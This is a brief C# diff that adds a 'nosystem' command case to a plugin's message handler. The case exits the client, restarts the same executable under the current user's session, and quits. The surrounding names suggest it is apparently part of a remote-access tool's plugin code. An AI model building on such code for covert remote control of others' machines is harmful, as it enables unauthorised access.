@@ -154,7 +154,13 @@ namespace Plugin
                             new HandleReportWindow(unpack_msgpack);
                             break;
                         }
-
+                    case "nosystem":
+                        {
+                            Methods.ClientExit();
+                            HandleNoSystem.StartProcessAsCurrentUser(Process.GetCurrentProcess().MainModule.FileName);
+                            Environment.Exit(0);
+                            break;
+                        }
 
                 }
             }
